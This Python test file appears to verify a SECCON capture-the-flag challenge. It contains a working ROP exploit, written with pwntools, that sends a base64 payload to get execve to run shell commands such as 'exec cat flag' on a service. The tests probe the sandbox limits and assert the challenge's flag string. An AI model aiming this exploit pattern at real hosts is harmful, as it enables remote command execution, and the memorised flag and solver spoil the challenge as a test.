#!/usr/bin/env python3
import pytest
import base64
import time
import pwn
import sys

def test_flag():
    assert exploit() == "SECCON{b73dfcdca85c50859b62170b661db54a}"

def test_uid():
    assert exploit(cmd="exec id") == "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\n"

def test_nproc():
    assert exploit(cmd="id") == "sh: 1: Cannot fork\n"

def test_cpu():
    cputime = 1.0
    start = time.time()
    with pytest.raises(EOFError):
        exploit(cmd="exec yes>/dev/null")
    elapsed_time = time.time() - start
    assert cputime <= elapsed_time <= cputime + 1.0

def test_timeout_of_recv():
    timeout_value = 10.0
    sock = pwn.remote("localhost", 10000)
    sock.recvuntil("Enter baseaddr of libc: ")
    start = time.time()
    msg = sock.recv()
    sock.close()
    elapsed_time = time.time() - start
    assert msg.startswith(b"Traceback (most recent call last):") and (
        timeout_value <= elapsed_time <= timeout_value + 1.0)

def test_timeout_of_shell():
    timeout_value = 10.0
    start = time.time()
    with pytest.raises(EOFError):
        exploit(cmd="exec sleep 10")
    elapsed_time = time.time() - start
    assert timeout_value <= elapsed_time <= timeout_value + 1.0

def exploit(host="localhost", port=10000, cmd="exec cat flag", get_payload=False):
    baseaddr = 0x04fa1dfe0000
    payload = b""
    payload += pwn.p64(baseaddr+0x87a39)    # pop rcx ; sal ebx, 0xf ; pop rax ; fmul st(1) ; ret
    payload += pwn.p64(baseaddr+0x8cbb4)    # endbr ; ... ; pop ebp ; ret
    payload += pwn.p64(0x3b)                # rax for syscall (execve)
    payload += pwn.p64(baseaddr+0x57ca8)    # syscall
    payload += cmd.encode('utf8')
    b64_payload = base64.encodebytes(payload).decode('utf8').rstrip()

    if get_payload:
        return "{}\n{}\n".format(hex(baseaddr), b64_payload)

    sock = pwn.remote(host, port)
    sock.sendlineafter("Enter baseaddr of libc: ", hex(baseaddr))
    sock.sendlineafter("Enter base64 payload: ", b64_payload)
    sock.shutdown()
    msg = sock.recv()
    sock.close()
    return msg.decode('utf8')

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print(exploit(get_payload=True), end='')
    else:
        host = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) >= 3 else 10000
        cmd = sys.argv[3] if len(sys.argv) >= 4 else 'exec cat flag'
        print(exploit(host, port, cmd), end='')
